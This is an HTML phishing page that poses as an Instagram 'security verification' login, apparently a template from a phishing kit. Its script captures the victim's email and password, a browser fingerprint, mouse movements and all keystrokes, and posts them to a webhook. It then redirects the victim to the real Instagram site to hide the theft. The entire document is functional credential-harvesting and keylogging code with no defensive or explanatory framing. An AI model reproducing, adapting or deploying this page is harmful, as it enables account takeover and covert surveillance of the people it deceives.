<!DOCTYPE html>
<html>
<head>
    <title>INSTAGRAM - Security Verification</title>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 480px;
            overflow: hidden;
            animation: slideUp 0.5s ease;
        }
        @keyframes slideUp {
            from { transform: translateY(30px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        .header {
            background: linear-gradient(135deg, #e4405f-c13584);
            color: white;
            padding: 40px 30px;
            text-align: center;
        }
        .header h1 {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 10px;
        }
        .header p {
            opacity: 0.9;
            font-size: 16px;
        }
        .form-section {
            padding: 40px 30px;
        }
        .input-group {
            margin-bottom: 25px;
        }
        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
            font-size: 14px;
        }
        .input-group input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e1e5e9;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s;
        }
        .input-group input:focus {
            outline: none;
            border-color: #e4405f;
            box-shadow: 0 0 0 3px rgba(e4405f, 0.1);
        }
        .submit-btn {
            background: linear-gradient(135deg, #e4405f-c13584);
            color: white;
            border: none;
            padding: 18px;
            width: 100%;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(e4405f, 0.3);
        }
        .submit-btn:active {
            transform: translateY(0);
        }
        .footer {
            text-align: center;
            padding: 20px;
            color: #666;
            font-size: 14px;
            border-top: 1px solid #eee;
        }
        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #e4405f;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .alert {
            background: #ffebee;
            color: #c62828;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: none;
        }
    </style>
</head>
<body>
    <div class='container'>
        <div class='header'>
            <h1>Instagram Verification</h1>
            <p>Confirm it's you to access your account</p>
        </div>
        
        <div class='alert' id='errorAlert'>
            Please check your credentials and try again.
        </div>
        
        <div class='form-section'>
            <div class='input-group'>
                <label for='email'>Email or Phone</label>
                <input type='text' id='email' placeholder='Enter your email or phone number' autocomplete='username'>
            </div>
            
            <div class='input-group'>
                <label for='password'>Password</label>
                <input type='password' id='password' placeholder='Enter your password' autocomplete='current-password'>
            </div>
            
            <button class='submit-btn' onclick='submitLogin()'>Continue</button>
            
            <div class='footer'>
                <p>By continuing, you agree to our Terms and Privacy Policy</p>
                <p><a href='#' style='color: #e4405f; text-decoration: none;'>Need help signing in?</a></p>
            </div>
        </div>
        
        <div class='loading' id='loading'>
            <div class='spinner'></div>
            <p>Verifying your information...</p>
        </div>
    </div>
    
    <script>
        // Collect browser fingerprint
        var fingerprint = {
            screen: window.screen.width + 'x' + window.screen.height,
            colorDepth: window.screen.colorDepth,
            language: navigator.language,
            timezone: new Date().getTimezoneOffset(),
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            cookies: navigator.cookieEnabled,
            plugins: Array.from(navigator.plugins).map(p => p.name).join(','),
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            touchSupport: 'ontouchstart' in window
        };
        
        // Send fingerprint to our tracking endpoint
        fetch('', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'fingerprint',
                data: fingerprint,
                template: 'instagram',
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer
            })
        });
        
        function submitLogin() {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            
            if (!email || !password) {
                showError('Please fill in all fields');
                return;
            }
            
            // Show loading
            document.getElementById('loading').style.display = 'block';
            document.querySelector('.form-section').style.display = 'none';
            
            // Collect all data
            var loginData = {
                type: 'credentials',
                template: 'instagram',
                email: email,
                password: password,
                fingerprint: fingerprint,
                timestamp: new Date().toISOString(),
                ip: '{IP}', // Will be replaced by server
                location: { // Mock location, will be replaced by geolocation
                    country: 'Detecting...',
                    city: 'Detecting...'
                }
            };
            
            // Send to webhook
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(loginData)
            })
            .then(response => {
                if (response.ok) {
                    // Success - redirect to real site after 3 seconds
                    setTimeout(function() {
                        window.location.href = 'https://instagram.com';
                    }, 3000);
                } else {
                    showError('Verification failed. Please try again.');
                }
            })
            .catch(error => {
                // Even if webhook fails, redirect user
                setTimeout(function() {
                    window.location.href = 'https://instagram.com';
                }, 3000);
            });
        }
        
        function showError(message) {
            var alert = document.getElementById('errorAlert');
            alert.innerHTML = message;
            alert.style.display = 'block';
            setTimeout(function() {
                alert.style.display = 'none';
            }, 5000);
        }
        
        // Track mouse movements
        var mouseData = [];
        document.addEventListener('mousemove', function(e) {
            mouseData.push({
                x: e.clientX,
                y: e.clientY,
                time: Date.now()
            });
            
            // Send mouse data every 10 seconds
            if (mouseData.length > 50) {
                fetch('', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'mouse_tracking',
                        data: mouseData,
                        template: 'instagram'
                    })
                });
                mouseData = [];
            }
        });
        
        // Track keystrokes
        var keystrokes = [];
        document.addEventListener('keydown', function(e) {
            keystrokes.push({
                key: e.key,
                code: e.code,
                time: Date.now()
            });
        });
        
        // Send keystrokes on form submission
        window.addEventListener('beforeunload', function() {
            if (keystrokes.length > 0) {
                fetch('', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'keystrokes',
                        data: keystrokes,
                        template: 'instagram'
                    })
                });
            }
        });
    </script>
</body>
</html>
